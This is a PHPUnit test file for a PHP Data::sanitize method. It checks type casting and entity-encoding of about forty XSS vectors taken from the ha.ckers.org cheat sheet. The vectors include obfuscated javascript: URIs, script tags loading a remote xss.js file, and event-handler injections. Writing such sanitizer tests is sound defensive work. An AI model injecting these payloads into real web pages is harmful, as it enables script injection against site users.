<?php

namespace nx\test\lib;

use nx\lib\Data;

class DataTest extends \PHPUnit_Framework_TestCase {    

    public function test_SanitizeXSS_ReturnsCleanData() {
        // Tests taken from http://ha.ckers.org/xss.html
        $tests = array(
<<<'EOD'
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
EOD
,

<<<'EOD'
'';!--"<XSS>=&{()}
EOD
,

<<<'EOD'
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
EOD
,

<<<'EOD'
<IMG SRC="javascript:alert('XSS');">
EOD
,

<<<'EOD'
<IMG SRC=javascript:alert('XSS')>
EOD
,

<<<'EOD'
<IMG SRC=JaVaScRiPt:alert('XSS')>
EOD
,

<<<'EOD'
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
EOD
,

<<<'EOD'
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
EOD
,

<<<'EOD'
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
EOD
,

<<<'EOD'
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
EOD
,

<<<'EOD'
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
EOD
,

<<<'EOD'
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
EOD
,

<<<'EOD'
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
EOD
,

<<<'EOD'
<IMG SRC="jav	ascript:alert('XSS');">
EOD
,

<<<'EOD'
<IMG SRC="jav&#x09;ascript:alert('XSS');">
EOD
,

<<<'EOD'
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
EOD
,

<<<'EOD'
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
EOD
,

<<<'EOD'
<IMG
SRC
=
"
j
a
v
a
s
c
r
i
p
t
:
a
l
e
r
t
(
'
X
S
S
')
"
>

EOD
,

<<<'EOD'
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
EOD
,

<<<'EOD'
perl -e 'print "<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>";' > out
EOD
,

<<<'EOD'
<IMG SRC=" &#14;  javascript:alert('XSS');">
EOD
,

<<<'EOD'
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
EOD
,

<<<'EOD'
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
EOD
,

<<<'EOD'
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
EOD
,

<<<'EOD'
<<SCRIPT>alert("XSS");//<</SCRIPT>
EOD
,

<<<'EOD'
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
EOD
,

<<<'EOD'
<SCRIPT SRC=//ha.ckers.org/.j>
EOD
,

<<<'EOD'
<IMG SRC="javascript:alert('XSS')"
EOD
,

<<<'EOD'
<SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
EOD
,

<<<'EOD'
\";alert('XSS');//
EOD
,

<<<'EOD'
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
EOD
,

<<<'EOD'
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
EOD
,

<<<'EOD'
<BODY BACKGROUND="javascript:alert('XSS')">
EOD
,

<<<'EOD'
<BODY ONLOAD=alert('XSS')>
EOD
,

<<<'EOD'
<IMG DYNSRC="javascript:alert('XSS')">
EOD
,

<<<'EOD'
<IMG LOWSRC="javascript:alert('XSS')">
EOD
,

<<<'EOD'
<BGSOUND SRC="javascript:alert('XSS');">
EOD
,

<<<'EOD'
<BR SIZE="&{alert('XSS')}">
EOD
        );

        $replacements = array(
            '&'  => '&#38;',
            '<'  => '&#60;',
            '>'  => '&#62;',
            '"'  => '&#34;',
            "'"  => '&#39;',
            "\n" => '',
            "\t" => ''
        );

        $type = 's';
        $keys = array_keys($replacements);
        $values = array_values($replacements);
        foreach ( $tests as $test ) {
            $check = str_replace($keys, $values, $test); 
            $clean = Data::sanitize($test, $type);
            $this->assertEquals($clean, $check, 'HTML `' . $test . '` was not properly stripped.');
        }

    }

    public function test_Sanitize_ReturnsTypecastedData() {
        // Bool to bool
        $dirty = true;
        $type = 'b';
        $check = true;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Boolean `true` was not sanitized to boolean `true`.');

        // Bool to float
        $dirty = true;
        $type = 'f';
        $check = 1;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Boolean `true` was not sanitized to float `1`.');

        // Bool to int
        $dirty = false;
        $type = 'i';
        $check = 0;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Boolean `false` was not sanitized to integer `0`.');

        // Bool to string
        $dirty = true;
        $type = 's';
        $check = '1';
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Boolean `true` was not sanitized to string `1`.');

        // Bool to string
        $dirty = false;
        $type = 's';
        $check = '';
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Boolean `false` was not sanitized to empty string ``.');

        // Float to bool
        $dirty = 1.234;
        $type = 'b';
        $check = true;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Float `1.234` was not sanitized to boolean `true`.');

        // Float to float
        $dirty = 1.234;
        $type = 'f';
        $check = 1.234;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Float `1.234` was not sanitized to float `1.234`.');

        // Float to int
        $dirty = 1.928;
        $type = 'i';
        $check = 1928;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Float `1.928` was not sanitized to integer `1928`.');

        // Float to string
        $dirty = 1.928;
        $type = 's';
        $check = '1.928';
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Float `1.928` was not sanitized to string `1.928`.');

        // Int to bool
        $dirty = 0;
        $type = 'b';
        $check = false;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Integer `0` was not sanitized to boolean `false`.');

        // Int to bool
        $dirty = 1;
        $type = 'b';
        $check = true;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Integer `1` was not sanitized to boolean `true`.');

        // Int to float
        $dirty = 2;
        $type = 'f';
        $check = 2;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Integer `2` was not sanitized to float `2`.');

        // Int to int
        $dirty = 3;
        $type = 'i';
        $check = 3;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Integer `3` was not sanitized to integer `3`.');

        // Int to string
        $dirty = 3;
        $type = 's';
        $check = '3';
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'Integer `3` was not sanitized to string `3`.');

        // String to bool
        $dirty = 'true';
        $type = 'b';
        $check = false;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'String `true` was not sanitized to boolean `false`.');

        // String to bool
        $dirty = '1';
        $type = 'b';
        $check = true;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'String `1` was not sanitized to boolean `true`.');

        // String to float
        $dirty = "1.928";
        $type = 'f';
        $check = 1.928;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'String `1.928` was not sanitized to float `1.928`.');

        // String to int
        $dirty = "1";
        $type = 'i';
        $check = 1;
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'String `1` was not sanitized to integer `1`.');

        // String to int
        $dirty = "1.928";
        $type = 'i';
        $check = 1.928;
        $clean = Data::sanitize($dirty, $type);
        $this->assertNotEquals($clean, $check, 'String `1.928` sanitized as an integer should not return `1.928`.');

        // String to string
        $dirty = 'test';
        $type = 's';
        $check = 'test';
        $clean = Data::sanitize($dirty, $type);
        $this->assertEquals($clean, $check, 'String `test` was not sanitized to string `test`.');
    }
}
?>
